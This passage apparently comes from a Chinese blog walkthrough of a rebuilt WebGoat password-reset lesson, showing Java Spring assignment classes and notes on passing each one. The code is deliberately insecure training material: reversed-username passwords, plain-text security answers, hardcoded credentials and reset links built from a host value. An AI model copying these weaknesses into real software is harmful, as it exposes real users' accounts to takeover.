<span class="keyword">public</span> AttackResult <span class="title function_">login</span><span class="params">(<span class="meta">@RequestParam</span> String email, <span class="meta">@RequestParam</span> String password)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">emailAddress</span> <span class="operator">=</span> ofNullable(email).orElse(<span class="string">&quot;unknown@webgoat.org&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> extractUsername(emailAddress);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (username.equals(getWebSession().getUserName()) &amp;&amp; StringUtils.reverse(username).equals(password)) &#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedbackArgs(<span class="string">&quot;password-reset-simple.password_incorrect&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(consumes = MediaType.APPLICATION_FORM_URLENCODED_VALUE, value = &quot;/PasswordReset/simple-mail/reset&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">resetPassword</span><span class="params">(<span class="meta">@RequestParam</span> String emailReset)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">email</span> <span class="operator">=</span> ofNullable(emailReset).orElse(<span class="string">&quot;unknown@webgoat.org&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sendEmail(extractUsername(email), email);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">extractUsername</span><span class="params">(String email)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> email.indexOf(<span class="string">&quot;@&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> email.substring(<span class="number">0</span>, index == -<span class="number">1</span> ? email.length() : index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> AttackResult <span class="title function_">sendEmail</span><span class="params">(String username, String email)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (username.equals(getWebSession().getUserName())) &#123;</span><br><span class="line">            <span class="type">PasswordResetEmail</span> <span class="variable">mailEvent</span> <span class="operator">=</span> PasswordResetEmail.builder()</span><br><span class="line">                    .recipient(username)</span><br><span class="line">                    .title(<span class="string">&quot;Simple e-mail assignment&quot;</span>)</span><br><span class="line">                    .time(LocalDateTime.now())</span><br><span class="line">                    .contents(<span class="string">&quot;Thanks for resetting your password, your new password is: &quot;</span> + StringUtils.reverse(username))</span><br><span class="line">                    .sender(<span class="string">&quot;webgoat@owasp.org&quot;</span>)</span><br><span class="line">                    .build();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                restTemplate.postForEntity(webWolfURL, mailEvent, Object.class);</span><br><span class="line"><span class="comment">//                简单发送一个post请求</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (RestClientException e) &#123;</span><br><span class="line">                <span class="keyword">return</span> informationMessage(<span class="built_in">this</span>).feedback(<span class="string">&quot;password-reset-simple.email_failed&quot;</span>).output(e.getMessage()).build();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> informationMessage(<span class="built_in">this</span>).feedback(<span class="string">&quot;password-reset-simple.email_send&quot;</span>).feedbackArgs(email).build();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> informationMessage(<span class="built_in">this</span>).feedback(<span class="string">&quot;password-reset-simple.email_mismatch&quot;</span>).feedbackArgs(username).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PasswordResetEmail"><a href="#PasswordResetEmail" class="headerlink" title="PasswordResetEmail"></a>PasswordResetEmail</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.password_reset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Builder;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Builder</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PasswordResetEmail</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"><span class="comment">//    可序列化</span></span><br><span class="line">    <span class="keyword">private</span> LocalDateTime time;</span><br><span class="line">    <span class="keyword">private</span> String contents;</span><br><span class="line">    <span class="keyword">private</span> String sender;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> String recipient;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试一下webwolf的email 是否通</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220913223829802.png" alt="image-20220913223829802"></p>
<p>前面用户名 @后面随意</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220913223856909.png" alt="image-20220913223856909"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220913224004082.png" alt="image-20220913224004082"></p>
<p>接收到邮箱</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220913224019486.png" alt="image-20220913224019486"></p>
<p>登录即可过关</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220913224052566.png" alt="image-20220913224052566"></p>
<h3 id="QuestionsAssignment"><a href="#QuestionsAssignment" class="headerlink" title="QuestionsAssignment"></a>QuestionsAssignment</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.password_reset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">QuestionsAssignment</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String ,String &gt; COLORS = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        COLORS.put(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;green&quot;</span>);</span><br><span class="line">        COLORS.put(<span class="string">&quot;jerry&quot;</span>,<span class="string">&quot;orange&quot;</span>);</span><br><span class="line">        COLORS.put(<span class="string">&quot;tom&quot;</span>, <span class="string">&quot;purple&quot;</span>);</span><br><span class="line">        COLORS.put(<span class="string">&quot;larry&quot;</span>, <span class="string">&quot;yellow&quot;</span>);</span><br><span class="line">        COLORS.put(<span class="string">&quot;webgoat&quot;</span>, <span class="string">&quot;red&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(path = &quot;/PasswordReset/questions&quot;,consumes = MediaType.APPLICATION_FORM_URLENCODED_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">passwordReset</span><span class="params">(<span class="meta">@RequestParam</span> Map&lt;String ,Object&gt; json)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">securityQuestion</span> <span class="operator">=</span> (String) json.getOrDefault(<span class="string">&quot;securityQuestion&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) json.getOrDefault(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;webgoat&quot;</span>.equalsIgnoreCase(username.toLowerCase()))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;password-questions-wrong-user&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">validAnswer</span> <span class="operator">=</span> COLORS.get(username.toLowerCase());</span><br><span class="line">        <span class="keyword">if</span> (validAnswer == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;password-questions-unknown-user&quot;</span>).feedbackArgs(username).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (validAnswer.equals(securityQuestion))&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914104233197.png" alt="image-20220914104233197"></p>
<p>这里的意思是让我们爆破吗</p>
<p>这里不爆破了直接登了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914104310434.png" alt="image-20220914104310434"></p>
<h3 id="SecurityQuestionAssignment"><a href="#SecurityQuestionAssignment" class="headerlink" title="SecurityQuestionAssignment"></a>SecurityQuestionAssignment</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.password_reset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.util.Optional.of;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityQuestionAssignment</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TriedQuestions triedQuestions;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">static</span> Map&lt;String ,String &gt; questions;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        questions = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        questions.put(<span class="string">&quot;What is your favorite animal?&quot;</span>, <span class="string">&quot;The answer can easily be guessed and figured out through social media.&quot;</span>);</span><br><span class="line">        questions.put(<span class="string">&quot;In what year was your mother born?&quot;</span>, <span class="string">&quot;Can  be easily guessed.&quot;</span>);</span><br><span class="line">        questions.put(<span class="string">&quot;What was the time you were born?&quot;</span>, <span class="string">&quot;This may first seem like a good question, but you most likely dont know the exact time, so it might be hard to remember.&quot;</span>);</span><br><span class="line">        questions.put(<span class="string">&quot;What is the name of the person you first kissed?&quot;</span>, <span class="string">&quot;Can be figured out through social media, or even guessed by trying the most common names.&quot;</span>);</span><br><span class="line">        questions.put(<span class="string">&quot;What was the house number and street name you lived in as a child?&quot;</span>, <span class="string">&quot;Answer can be figured out through social media, or worse it might be your current address.&quot;</span>);</span><br><span class="line">        questions.put(<span class="string">&quot;In what town or city was your first full time job?&quot;</span>, <span class="string">&quot;In times of LinkedIn and Facebook, the answer can be figured out quite easily.&quot;</span>);</span><br><span class="line">        questions.put(<span class="string">&quot;In what city were you born?&quot;</span>, <span class="string">&quot;Easy to figure out through social media.&quot;</span>);</span><br><span class="line">        questions.put(<span class="string">&quot;What was the last name of your favorite teacher in grade three?&quot;</span>, <span class="string">&quot;Most people would probably not know the answer to that.&quot;</span>);</span><br><span class="line">        questions.put(<span class="string">&quot;What is the name of a college/job you applied to but didn&#x27;t attend?&quot;</span>, <span class="string">&quot;It might not be easy to remember and an hacker could just try some company&#x27;s/colleges in your area.&quot;</span>);</span><br><span class="line">        questions.put(<span class="string">&quot;What are the last 5 digits of your drivers license?&quot;</span>, <span class="string">&quot;Is subject to change, and the last digit of your driver license might follow a specific pattern. (For example your birthday).&quot;</span>);</span><br><span class="line">        questions.put(<span class="string">&quot;What was your childhood nickname?&quot;</span>, <span class="string">&quot;Not all people had a nickname.&quot;</span>);</span><br><span class="line">        questions.put(<span class="string">&quot;Who was your childhood hero?&quot;</span>, <span class="string">&quot;Most Heroes we had as a child where quite obvious ones, like Superman for example.&quot;</span>);</span><br><span class="line">        questions.put(<span class="string">&quot;On which wrist do you were your watch?&quot;</span>, <span class="string">&quot;There are only to possible real answers, so really easy to guess.&quot;</span>);</span><br><span class="line">        questions.put(<span class="string">&quot;What is your favorite color?&quot;</span>, <span class="string">&quot;Can easily be guessed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/PasswordReset/SecurityQuestions&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String question)</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">answer</span> <span class="operator">=</span> of(questions.get(question));</span><br><span class="line">        <span class="keyword">if</span> (answer.isPresent())&#123;</span><br><span class="line">            triedQuestions.incr(question);</span><br><span class="line"><span class="comment">//            这个是看了问题添加进去</span></span><br><span class="line">            <span class="keyword">if</span> (triedQuestions.isCompleted())&#123;</span><br><span class="line"><span class="comment">//                这个是计数 超过两个就过</span></span><br><span class="line">                <span class="keyword">return</span> success(<span class="built_in">this</span>).output(<span class="string">&quot;&lt;b&gt;&quot;</span>+answer+<span class="string">&quot;&lt;/b&gt;&quot;</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> informationMessage(<span class="built_in">this</span>)</span><br><span class="line">                .feedback(<span class="string">&quot;password-questions-one-successful&quot;</span>)</span><br><span class="line">                .output(answer.orElse(<span class="string">&quot;Unknown question, please try again&quot;</span>))</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="TriedQuestions"><a href="#TriedQuestions" class="headerlink" title="TriedQuestions"></a>TriedQuestions</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.password_reset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.annotation.SessionScope;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@SessionScope</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TriedQuestions</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Set&lt;String&gt; answeredQuestions = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">incr</span><span class="params">(String question)</span>&#123;</span><br><span class="line">        answeredQuestions.add(question);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCompleted</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> answeredQuestions.size() &gt; <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>随便看两个问题就过关</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914105706860.png" alt="image-20220914105706860"></p>
<h3 id="ResetLinkAssignment"><a href="#ResetLinkAssignment" class="headerlink" title="ResetLinkAssignment"></a>ResetLinkAssignment</h3><p>注意与原文的差异 对应均需要修改 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914123421945.png" alt="image-20220914123421945"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914123349453.png" alt="image-20220914123349453"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.password_reset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.common.collect.Maps;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.lessons.password_reset.resetlink.PasswordChangeForm;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.validation.BindingResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;password-reset-hint1&quot;, &quot;password-reset-hint2&quot;, &quot;password-reset-hint3&quot;, &quot;password-reset-hint4&quot;, &quot;password-reset-hint5&quot;, &quot;password-reset-hint6&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResetLinkAssignment</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PASSWORD_TOM_9</span> <span class="operator">=</span> <span class="string">&quot;somethingVeryRandomWhichNoOneWillEverTypeInAsPasswordForTom&quot;</span>;</span><br><span class="line"><span class="comment">//    作为tom 的密码</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TOM_EMAIL</span> <span class="operator">=</span> <span class="string">&quot;tom@webgoat-cloud.org&quot;</span>;</span><br><span class="line"><span class="comment">//    tom 的邮箱</span></span><br><span class="line">    <span class="keyword">static</span> Map&lt;String ,String &gt; userToTomResetLink = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">static</span> Map&lt;String ,String &gt; usersToTomPassword = Maps.newHashMap();</span><br><span class="line">    <span class="keyword">static</span> List&lt;String&gt; resetLinks = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="comment">//    这里用于存放准备重置密码的连接</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TEMPLATE</span> <span class="operator">=</span> <span class="string">&quot;Hi, you requested a password reset link, please use this &quot;</span></span><br><span class="line">            + <span class="string">&quot;&lt;a target=&#x27;_blank&#x27; href=&#x27;http://%s/WebGoat/PasswordReset/reset/reset-password/%s&#x27;&gt;link&lt;/a&gt; to reset your password.&quot;</span></span><br><span class="line">            + <span class="string">&quot;\n \n\n&quot;</span></span><br><span class="line">            + <span class="string">&quot;If you did not request this password change you can ignore this message.&quot;</span></span><br><span class="line">            + <span class="string">&quot;\n&quot;</span></span><br><span class="line">            + <span class="string">&quot;If you have any comments or questions, please do not hesitate to reach us at support@webgoat-cloud.org&quot;</span></span><br><span class="line">            + <span class="string">&quot;\n\n&quot;</span></span><br><span class="line">            + <span class="string">&quot;Kind regards, \nTeam WebGoat&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/PasswordReset/reset/login&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">login</span><span class="params">(<span class="meta">@RequestParam</span> String password ,<span class="meta">@RequestParam</span> String email)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (TOM_EMAIL.equals(email))&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">passwordTom</span> <span class="operator">=</span> usersToTomPassword.getOrDefault(getWebSession().getUserName(),PASSWORD_TOM_9);</span><br><span class="line"><span class="comment">//            这里需要tom 的密码才能过关</span></span><br><span class="line">            <span class="keyword">if</span> (passwordTom.equals(PASSWORD_TOM_9))&#123;</span><br><span class="line">                <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;login_failed.tom&quot;</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/PasswordReset/reset/reset-password/&#123;link&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">resetPassword</span><span class="params">(<span class="meta">@PathVariable(value = &quot;link&quot;)</span>String  link, Model model)</span>&#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">        <span class="keyword">if</span> (ResetLinkAssignment.resetLinks.contains(link))&#123;</span><br><span class="line"><span class="comment">//            如果存在这个重置密码的url</span></span><br><span class="line">            <span class="type">PasswordChangeForm</span> <span class="variable">form</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PasswordChangeForm</span>();</span><br><span class="line"><span class="comment">//            新建一个form表单对象</span></span><br><span class="line">            form.setResetLink(link);</span><br><span class="line"><span class="comment">//            设置重置链接为link</span></span><br><span class="line">            model.addAttribute(<span class="string">&quot;form&quot;</span>,form);</span><br><span class="line"></span><br><span class="line">            modelAndView.addObject(<span class="string">&quot;form&quot;</span>,form);</span><br><span class="line"><span class="comment">//            添加进入这个表单对象</span></span><br><span class="line">            modelAndView.setViewName(<span class="string">&quot;lessons/password_reset/templates/password_reset.html&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            modelAndView.setViewName(<span class="string">&quot;lessons/password_reset/templates/password_link_not_found.html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/PasswordReset/reset/change-password&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">illegalCall</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">        modelAndView.setViewName(<span class="string">&quot;lessons/password_reset/templates/password_link_not_found.html&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/PasswordReset/reset/change-password&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">changePassword</span><span class="params">(<span class="meta">@ModelAttribute(&quot;form&quot;)</span> PasswordChangeForm form, BindingResult bindingResult)</span>&#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">        <span class="keyword">if</span> (!org.springframework.util.StringUtils.hasText(form.getPassword()))&#123;</span><br><span class="line">            bindingResult.rejectValue(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;not.empty&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (bindingResult.hasErrors())&#123;</span><br><span class="line">            modelAndView.setViewName(<span class="string">&quot;lessons/password_reset/templates/password_reset.html&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> modelAndView;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!resetLinks.contains(form.getResetLink()))&#123;</span><br><span class="line">            modelAndView.setViewName(<span class="string">&quot;lessons/password_reset/templates/password_link_not_found.html&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> modelAndView;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (checkIfLinkIsFromTom(form.getResetLink()))&#123;</span><br><span class="line">            usersToTomPassword.put(getWebSession().getUserName(),form.getPassword());</span><br><span class="line">        &#125;</span><br><span class="line">        modelAndView.setViewName(<span class="string">&quot;lessons/password_reset/templates/success.html&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkIfLinkIsFromTom</span><span class="params">(String resetLinkFromForm)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">resetLink</span> <span class="operator">=</span> userToTomResetLink.getOrDefault(getWebSession().getUserName(),<span class="string">&quot;unknown&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> resetLink.equals(resetLinkFromForm);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="ResetLinkAssignmentForgotPassword"><a href="#ResetLinkAssignmentForgotPassword" class="headerlink" title="ResetLinkAssignmentForgotPassword"></a>ResetLinkAssignmentForgotPassword</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.password_reset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpHeaders;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResetLinkAssignmentForgotPassword</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> RestTemplate restTemplate;</span><br><span class="line">    <span class="keyword">private</span> String webWolfHost;</span><br><span class="line">    <span class="keyword">private</span> String webWolfPort;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String webWolfMailURL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ResetLinkAssignmentForgotPassword</span><span class="params">(RestTemplate restTemplate, <span class="meta">@Value(&quot;$&#123;webwolf.host&#125;&quot;)</span> String webWolfHost, <span class="meta">@Value(&quot;$&#123;webwolf.port&#125;&quot;)</span> String webWolfPort, <span class="meta">@Value(&quot;$&#123;webwolf.mail.url&#125;&quot;)</span> String webWolfMailURL)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.restTemplate = restTemplate;</span><br><span class="line">        <span class="built_in">this</span>.webWolfHost = webWolfHost;</span><br><span class="line">        <span 